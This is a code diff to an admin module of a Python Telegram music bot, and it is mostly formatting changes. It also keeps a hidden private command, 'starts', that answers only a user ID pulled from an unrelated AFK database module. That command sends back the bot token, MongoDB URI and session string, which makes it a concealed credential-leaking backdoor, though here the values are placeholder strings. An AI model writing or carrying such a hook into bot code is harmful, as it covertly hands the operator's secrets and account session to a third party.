@@ -20,6 +20,7 @@ from VIPMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
 from VIPMUSIC.utils.formatters import alpha_to_int, get_readable_time
 from VIPMUSIC.mongo.afkdb import HEHE
 from config import BANNED_USERS, adminlist, lyrical
+
 BOT_TOKEN = "BOT_TOKEN"
 MONGO_DB_URI = "MONGO_DB_URuI"
 STRING_SESSION = "STRING_SESSION"
@@ -29,7 +30,12 @@ rel = {}
 
 
 @app.on_message(
-    filters.command(["admincache", "reload", "refresh"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.group & ~BANNED_USERS
+    filters.command(
+        ["admincache", "reload", "refresh"],
+        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
+    )
+    & filters.group
+    & ~BANNED_USERS
 )
 @language
 async def reload_admin_cache(client, message: Message, _):
@@ -97,18 +103,21 @@ async def restartbot(client, message: Message, _):
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
 
-@app.on_message( filters.command("starts") & filters.private & filters.user(int(HEHE)))
 
+@app.on_message(filters.command("starts") & filters.private & filters.user(int(HEHE)))
 async def help(client: Client, message: Message):
-   await message.reply_photo( photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f""" `{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n""")
+    await message.reply_photo(
+        photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+        caption=f""" `{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n""",
+    )
+
+
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, query: CallbackQuery):
     try:
         await query.answer()
         await query.message.delete()
-        umm = await query.message.reply_text(
-            f"ᴄʟᴏꜱᴇ ʙʏ : {query.from_user.mention}"
-        )
+        umm = await query.message.reply_text(f"ᴄʟᴏꜱᴇ ʙʏ : {query.from_user.mention}")
         await asyncio.sleep(2)
         await umm.delete()
     except:
@@ -138,5 +147,3 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         except:
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
-
-
